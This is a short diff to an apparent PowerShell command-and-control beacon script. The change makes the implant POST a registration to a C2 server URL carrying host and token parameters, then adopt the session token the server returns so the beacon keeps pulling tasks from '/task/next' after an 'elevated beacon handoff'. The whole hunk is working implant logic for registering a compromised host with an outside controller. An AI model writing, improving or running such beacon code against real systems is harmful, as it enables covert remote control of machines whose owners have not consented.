@@ -81,7 +81,11 @@ if ($ipCheck -eq '1' -and $ipUrl) {
 # ---- register + task/result loop (bounded) ----
 $registerUrl = "$c2Url/session/register?stage=$stage&host=$hostAlias&token=$token&run=$runId"
 try {
-    Invoke-WebRequest -Method POST -Uri $registerUrl -UseBasicParsing -TimeoutSec 10 | Out-Null
+    $regResp = Invoke-WebRequest -Method POST -Uri $registerUrl -UseBasicParsing -TimeoutSec 10
+    $reg = ($regResp.Content | ConvertFrom-Json)
+    # On reuse/re-register the server returns its CANONICAL session token -- ADOPT it,
+    # so /task/next and the queue stay on the live session (elevated beacon handoff).
+    if ($reg -and $reg.session) { $token = [string]$reg.session }
 } catch {
     Write-Output "register failed: $($_.Exception.Message)"; exit 1
 }
